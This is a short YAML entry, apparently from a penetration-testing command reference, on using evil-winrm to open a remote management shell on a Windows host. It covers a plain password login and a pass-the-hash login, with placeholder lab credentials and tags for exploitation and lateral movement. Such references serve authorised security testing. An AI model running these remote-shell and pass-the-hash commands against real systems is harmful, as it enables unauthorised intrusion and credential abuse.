---
description: |
  Connect to a Windows machine via WinRM for remote management shell access.
  Requires valid credentials and WinRM enabled on the target.

  Reference values:
    Target IP: 10.10.10.1
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # With password
  evil-winrm -i 10.10.10.1 -u pentuser -p 'P@ssw0rd123'

  # With NTLM hash
  evil-winrm -i 10.10.10.1 -u pentuser -H aad3b435b51404eeaad3b435b51404ee
phase:
  - Exploitation
  - Lateral_Movement
target_os:
  - Windows
services:
  - WinRM
items:
  - Username
  - Password
  - Hash
techniques:
  - Pass-the-Hash_Ticket
network_position:
  - Internal
references:
  - https://github.com/Hackplayers/evil-winrm
---
